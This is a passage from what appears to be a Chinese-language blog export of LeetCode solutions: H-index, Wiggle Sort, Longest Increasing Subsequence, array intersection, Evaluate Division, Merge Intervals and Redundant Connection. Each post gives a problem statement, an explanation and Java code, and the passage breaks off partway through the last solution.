<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hIndex</span><span class="params">(<span class="keyword">int</span>[] citations)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(citations == <span class="keyword">null</span> || citations.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> length = citations.length;</span><br><span class="line">        <span class="keyword">int</span>[] aux = <span class="keyword">new</span> <span class="keyword">int</span>[length + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(citations[i] &gt;= length) aux[length]++;</span><br><span class="line">            <span class="keyword">else</span> aux[citations[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = length; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            t += aux[i];</span><br><span class="line">            <span class="keyword">if</span>(t &gt;= i) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-280</title>
    <url>/2018/11/19/leetcode-280/</url>
    <content><![CDATA[<h1 id="Wiggle-sort"><a href="#Wiggle-sort" class="headerlink" title="Wiggle sort"></a>Wiggle sort</h1><p>Given an unsorted array nums, reorder it in-place such that <code>nums[0] &lt;= nums[1] &gt;= nums[2] &lt;= nums[3]</code><br>For example, given <code>nums = [3, 5, 2, 1, 6, 4]</code>, one possible answer is <code>[1, 6, 2, 5, 3, 4]</code>.</p>
<h2 id="分析题意"><a href="#分析题意" class="headerlink" title="分析题意"></a>分析题意</h2><p>给定题目，可以观察到从1位置开始的偶数位置的数字都大于等于前一个位置的数字，而奇数位置的数字都小于等于前一个数字，由此可以遍历数组，若遇到奇数位置且其数字大于前一个数字或者偶数位置的数字小于前一个位置的数字，那么将两者做交换处理。由于遍历数组只有交换操作，可知时间复杂度为O(n)。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">wiggleSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>((i &amp; <span class="number">1</span>) == <span class="number">1</span> &amp;&amp; nums[i] &lt; nums[i - <span class="number">1</span>] || (i &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp; nums[i] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">int</span> t = nums[i];</span><br><span class="line">                nums[i] = nums[i - <span class="number">1</span>];</span><br><span class="line">                nums[i - <span class="number">1</span>] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-300</title>
    <url>/2018/12/23/leetcode-300/</url>
    <content><![CDATA[<h1 id="Longest-Increasing-Subsequence"><a href="#Longest-Increasing-Subsequence" class="headerlink" title="Longest Increasing Subsequence"></a>Longest Increasing Subsequence</h1><p>Given an unsorted array of integers, find the length of longest increasing subsequence.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [10,9,2,5,3,7,101,18]</span><br><span class="line">Output: 4 </span><br><span class="line">Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4.</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>Note:</p>
<ul>
<li>There may be more than one LIS combination, it is only necessary for you to return the length.</li>
<li>Your algorithm should run in O(n2) complexity.<br>Follow up: Could you improve it to O(n log n) time complexity?</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>作为动态规划做的第一道题，查找了一些资料，包括tutorialpoints和YouTube上花花酱对这个问题的解读。总结了一下，有如下几个思路可以考虑：</p>
<ul>
<li>首先是最naive的穷举法，我们设置一个和原数组等长的数组，将所有可能的子序列枚举，体现在我们这个new出来的数组对应位置为1，代表原数组对应位置的元素在这次排列中，于是我们穷举出所有的子序列，判断其递增性，然后每次将计数器加1即可。我们每个位置都有两种可能，取还是不取。那么时间复杂度在这种情况下是2^n。可见这种naive的方法只能是在脑海中想想，实际中一定会超时。需要对该方法利用DP的思想进行改良</li>
<li>第二种方法的思想是自顶向下的动态规划。(图片摘自花花酱的个人网站)，LIS这个函数，接收一个数组，返回以数组最后一项结尾的LIS长度。所以我们拿到一个数组，这个数组中的每一项都可能是LIS的最后一项，那么我们就分别假定数组中的每一项位LIS的最后一项，然后就会形成若干子问题，如图示的那样。这里面有一个剪枝就是如果数组中前面有某项大于最后一项了，就不要计算这个分支，因为肯定不是递增的一个序列了。所以我们将数组规模减小，递归的求解前面比末尾一项小的各项的LIS长度，然后加1，简单将最后一项加到这个LIS中，就形成了一个LIS，我们计算以每个项结尾的LIS，最后从这些LIS取最大。就可以找到LIS的长度了。但是这个过程有许多重复计算，我们开一个seen数组用来记录我们已经确定的以某项结尾的LIS长度，这样可以节省很多不必要的计算。</li>
</ul>


<ul>
<li>第三种是自底向上的动态规划。我们从数组头开始迭代，双重循环，外层表示到哪里结束的子序列，内层对产生的小问题向前查找比外层对应元素小的数字，这样才会形成一个递增序列。然后我们找到最长的那个LIS，将其置于seen数组中。循环结束后返回数组中最大的那个元素。</li>
</ul>


<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>自顶向下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> N = nums.length;</span><br><span class="line">        <span class="keyword">if</span>(N == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] seen = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            res = Math.max(res, lis(seen, nums, i));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">lis</span><span class="params">(<span class="keyword">int</span>[] seen, <span class="keyword">int</span>[] nums, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(seen[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> seen[i];</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">            <span class="keyword">if</span>(nums[j] &lt; nums[i])</span><br><span class="line">                res = Math.max(res, lis(seen, nums, j) + <span class="number">1</span>);</span><br><span class="line">        seen[i] = res;</span><br><span class="line">        <span class="keyword">return</span> seen[i];</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>自底向上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> N = nums.length;</span><br><span class="line">    <span class="keyword">int</span>[] seen = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    Arrays.fill(seen, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                seen[i] = Math.max(seen[i], seen[j] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(seen);</span><br><span class="line">    <span class="keyword">return</span> seen[N-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>dynamic programming</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-349</title>
    <url>/2018/11/19/leetcode-349/</url>
    <content><![CDATA[<h1 id="Intersection-of-Two-Arrays"><a href="#Intersection-of-Two-Arrays" class="headerlink" title="Intersection of Two Arrays"></a>Intersection of Two Arrays</h1><p>Given two arrays, write a function to compute their intersection.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]</span><br><span class="line">Output: [2]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums1 &#x3D; [4,9,5], nums2 &#x3D; [9,4,9,8,4]</span><br><span class="line">Output: [9,4]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>Each element in the result must be unique.</li>
<li>The result can be in any order.</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>找出两个数组的交集，不带重复元素。自然想到利用set的特性。首先遍历其中一个数组，将元素不重合的添加到set中，然后对第二个数组做遍历，若set含有这个元素，则加入到结果的set集合中，最后将结果set转换为数组。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="comment">// init a set which contains all numbers in nums1</span></span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num: nums1) &#123;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The set expression of the result</span></span><br><span class="line">        Set&lt;Integer&gt; aux_set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(set.contains(num)) &#123;</span><br><span class="line">                aux_set.add(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert the set to array</span></span><br><span class="line">        <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[aux_set.size()];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : aux_set) &#123;</span><br><span class="line">            res[i++] = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-350</title>
    <url>/2018/11/19/leetcode-350/</url>
    <content><![CDATA[<h1 id="Intersection-of-Two-Arrays-II"><a href="#Intersection-of-Two-Arrays-II" class="headerlink" title="Intersection of Two Arrays II"></a>Intersection of Two Arrays II</h1><p>Given two arrays, write a function to compute their intersection.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]</span><br><span class="line">Output: [2,2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums1 &#x3D; [4,9,5], nums2 &#x3D; [9,4,9,8,4]</span><br><span class="line">Output: [4,9]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li><p>Each element in the result should appear as many times as it shows in both arrays.</p>
</li>
<li><p>The result can be in any order.<br>Follow up:</p>
</li>
<li><p>What if the given array is already sorted? How would you optimize your algorithm?</p>
</li>
<li><p>What if nums1’s size is small compared to nums2’s size? Which algorithm is better?</p>
</li>
<li><p>What if elements of nums2 are stored on disk, and the memory is limited such that you cannot load all elements into the memory at once?</p>
</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>寻找两个数组的交集，并以尽可能多的次数出现。首先考虑遍历其中一个数组，将各数字出现的次数保存在map中，然后对另外一个数组做遍历，若map含有这个key就加入到结果list中，并且该key对应的value值要减小1，若减小至0，则删除这个key。最后将list转为数组即可。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] intersect(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// Construct map, key is integer, value is count</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums1) map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        List&lt;Integer&gt; aux_list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(num)) &#123;</span><br><span class="line">                aux_list.add(num);</span><br><span class="line">                map.put(num, map.get(num) - <span class="number">1</span>);</span><br><span class="line">                map.remove(num, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Convert aux_list to array</span></span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[aux_list.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; aux_list.size(); i++) &#123;</span><br><span class="line">            result[i] = aux_list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-399</title>
    <url>/2018/11/28/leetcode-399/</url>
    <content><![CDATA[<h1 id="Evaluate-Division"><a href="#Evaluate-Division" class="headerlink" title="Evaluate Division"></a>Evaluate Division</h1><p>Equations are given in the format A / B = k, where A and B are variables represented as strings, and k is a real number (floating point number). Given some queries, return the answers. If the answer does not exist, return -1.0.</p>
<p><strong>Example:</strong><br>Given a / b = 2.0, b / c = 3.0.<br>queries are: a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ? .<br>return [6.0, 0.5, -1.0, 1.0, -1.0 ].</p>
<p>The input is: vector&lt;pair&lt;string, string&gt;&gt; equations, vector<double>&amp; values, vector&lt;pair&lt;string, string&gt;&gt; queries , where equations.size() == values.size(), and the values are positive. This represents the equations. Return vector<double>.</p>
<p>According to the example above:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">equations &#x3D; [ [&quot;a&quot;, &quot;b&quot;], [&quot;b&quot;, &quot;c&quot;] ],</span><br><span class="line">values &#x3D; [2.0, 3.0],</span><br><span class="line">queries &#x3D; [ [&quot;a&quot;, &quot;c&quot;], [&quot;b&quot;, &quot;a&quot;], [&quot;a&quot;, &quot;e&quot;], [&quot;a&quot;, &quot;a&quot;], [&quot;x&quot;, &quot;x&quot;] ].</span><br></pre></td></tr></table></figure>
<p>The input is always valid. You may assume that evaluating the queries will result in no division by zero and there is no contradiction.</p>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>给定一些方程，试图去寻找一些query的解。如果query中出现未知的字母，就返回-1，否则根据已有的方程计算。本题可以抽象为图问题，即搜索路径。思路是首先还是建图，维护两个map，两个map都是字符串到ArrayList的映射，第一个map告诉我们哪两个点存在连接关系，而第二个map告诉我们相应的连接的值是多少。有一个需要注意的是，我们在建图的时候不仅要将a到b的值给出，还要将这个值的倒数计算出赋给b到a的值。建图之后就是对query遍历，对map进行dfs遍历，dfs需要检查几种特殊情况，第一种就是在我们维护的set中，这个是作函数栈的模拟，如果重复出现了start，说明这个图出现了环，为了避免死循环，需要终止递归，在这里就是返回0.0。还有就是若第一个map不存在start的key，那么说明没有路径，因为起点都不存在了。最后就是若start和end相等，这里要注意使用String.equal方法，这时就可以返回value了，说明找到了路径，并且可以返回相应的计算的值了。检查这三种情况后，就是常规的dfs，注意set在这里对栈的模拟，注意环的存在。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">double</span>[] calcEquation(String[][] equations, <span class="keyword">double</span>[] values, String[][] queries) &#123;</span><br><span class="line">        Map&lt;String, ArrayList&lt;String&gt;&gt; pairs = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;String, ArrayList&lt;Double&gt;&gt; valuePairs = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// 建图</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; equations.length; i++) &#123;</span><br><span class="line">            String[] equation = equations[i];</span><br><span class="line">            String x = equation[<span class="number">0</span>];</span><br><span class="line">            String y = equation[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(!pairs.containsKey(x)) &#123;</span><br><span class="line">                pairs.put(x, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">                valuePairs.put(x, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!pairs.containsKey(y)) &#123;</span><br><span class="line">                pairs.put(y, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">                valuePairs.put(y, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pairs.get(x).add(y);</span><br><span class="line">            valuePairs.get(x).add(values[i]);</span><br><span class="line"></span><br><span class="line">            pairs.get(y).add(x);</span><br><span class="line">            valuePairs.get(y).add(<span class="number">1</span> / values[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span>[] result = <span class="keyword">new</span> <span class="keyword">double</span>[queries.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            String[] query = queries[i];</span><br><span class="line">            result[i] = dfs(query[<span class="number">0</span>], query[<span class="number">1</span>], pairs, valuePairs, <span class="keyword">new</span> HashSet&lt;String&gt;(), <span class="number">1.0</span>);</span><br><span class="line">            <span class="keyword">if</span>(result[i] == <span class="number">0.0</span>) result[i] = -<span class="number">1.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">dfs</span><span class="params">(String start, String end, Map&lt;String, ArrayList&lt;String&gt;&gt; pairs, Map&lt;String, ArrayList&lt;Double&gt;&gt; valuePairs, Set&lt;String&gt; set, <span class="keyword">double</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set.contains(start)) <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">if</span>(!pairs.containsKey(start)) <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">if</span>(start.equals(end)) <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">        set.add(start);</span><br><span class="line">        ArrayList&lt;String&gt; pairList = pairs.get(start);</span><br><span class="line">        ArrayList&lt;Double&gt; valueList = valuePairs.get(start);</span><br><span class="line">        <span class="keyword">double</span> tmp = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pairList.size(); i++) &#123;</span><br><span class="line">            tmp = dfs(pairList.get(i), end, pairs, valuePairs, set, value * valueList.get(i));</span><br><span class="line">            <span class="keyword">if</span>(tmp != <span class="number">0.0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set.remove(start);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-56</title>
    <url>/2018/11/19/leetcode-56/</url>
    <content><![CDATA[<h1 id="Merge-Intervals"><a href="#Merge-Intervals" class="headerlink" title="Merge Intervals"></a>Merge Intervals</h1><p>Given a collection of intervals, merge all overlapping intervals.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[1,3],[2,6],[8,10],[15,18]]</span><br><span class="line">Output: [[1,6],[8,10],[15,18]]</span><br><span class="line">Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[1,4],[4,5]]</span><br><span class="line">Output: [[1,5]]</span><br><span class="line">Explanation: Intervals [1,4] and [4,5] are considerred overlapping.</span><br></pre></td></tr></table></figure>

<h2 id="分析题意"><a href="#分析题意" class="headerlink" title="分析题意"></a>分析题意</h2><p>该题让我们合并有交集的interval，首先利用start的大小对整个集合排序。然后对集合做遍历，若一个interval的start大于前面的end值说明存在overlap，需要将end值设为当前end和原来end二者中的最大值。否则说明interval是离散的，只需要将之前的start，end实例化为一个新的Interval实例，然后加入到集合，并初始化新的start和end值。遍历结束之后将最后一个start，end的interval加入到集合当中。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for an interval.</span></span><br><span class="line"><span class="comment"> * public class Interval &#123;</span></span><br><span class="line"><span class="comment"> *     int start;</span></span><br><span class="line"><span class="comment"> *     int end;</span></span><br><span class="line"><span class="comment"> *     Interval() &#123; start = 0; end = 0; &#125;</span></span><br><span class="line"><span class="comment"> *     Interval(int s, int e) &#123; start = s; end = e; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Interval&gt; <span class="title">merge</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals == <span class="keyword">null</span> || intervals.size() &lt;= <span class="number">1</span>) <span class="keyword">return</span> intervals;</span><br><span class="line"></span><br><span class="line">        intervals.sort((i1, i2) -&gt; i1.start - i2.start);</span><br><span class="line">        List&lt;Interval&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> start = intervals.get(<span class="number">0</span>).start;</span><br><span class="line">        <span class="keyword">int</span> end = intervals.get(<span class="number">0</span>).end;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Interval interval : intervals) &#123;</span><br><span class="line">            <span class="comment">// show this interval overlaps</span></span><br><span class="line">            <span class="keyword">if</span>(interval.start &lt;= end) end = Math.max(end, interval.end);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the interval disjoints</span></span><br><span class="line">                res.add(<span class="keyword">new</span> Interval(start, end));</span><br><span class="line">                start = interval.start;</span><br><span class="line">                end = interval.end;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// The last interval hasn't been added</span></span><br><span class="line">        res.add(<span class="keyword">new</span> Interval(start, end));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-684</title>
    <url>/2018/11/29/leetcode-684/</url>
    <content><![CDATA[<h1 id="Redundant-Connection"><a href="#Redundant-Connection" class="headerlink" title="Redundant Connection"></a>Redundant Connection</h1><p>In this problem, a tree is an <strong>undirected</strong> graph that is connected and has no cycles.</p>
<p>The given input is a graph that started as a tree with N nodes (with distinct values 1, 2, …, N), with one additional edge added. The added edge has two different vertices chosen from 1 to N, and was not an edge that already existed.</p>
<p>The resulting graph is given as a 2D-array of edges. Each element of edges is a pair [u, v] with u &lt; v, that represents an undirected edge connecting nodes u and v.</p>
<p>Return an edge that can be removed so that the resulting graph is a tree of N nodes. If there are multiple answers, return the answer that occurs last in the given 2D-array. The answer edge [u, v] should be in the same format, with u &lt; v.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[1,2], [1,3], [2,3]]</span><br><span class="line">Output: [2,3]</span><br></pre></td></tr></table></figure>
<p>Explanation: The given undirected graph will be like this:<br>  1<br> / <br>2 - 3<br>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[1,2], [2,3], [3,4], [1,4], [1,5]]</span><br><span class="line">Output: [1,4]</span><br></pre></td></tr></table></figure>
<p>Explanation: The given undirected graph will be like this:<br>5 - 1 - 2<br>    |   |<br>    4 - 3<br>Note:<br>The size of the input 2D-array will be between 3 and 1000.<br>Every integer represented in the 2D-array will be between 1 and N, where N is the size of the input array.</p>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>该题给定一个代表连接的二维数组，要寻找出一条冗余的边，去掉这条边可以将图变成树。最简单的考虑是利用union-find数据结构，当我们遇到一个连接时，首先检查是否这两个点已经连通，如果连通，那么说明这条边是一条冗余的边，由于题目要求多条冗余边出现时，返回最后一条，所以将这条边加入栈中。如果两点尚未连通，将其连通即可。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findRedundantConnection(<span class="keyword">int</span>[][] edges) &#123;</span><br><span class="line">        <span class="keyword">if</span>(edges == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(edges.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        Stack&lt;<span class="keyword">int</span>[]&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        WeightedQuickUnionUF uf = <span class="keyword">new</span> WeightedQuickUnionUF(edges.length + <span class="number">1</span>);</span><br><span class="line">        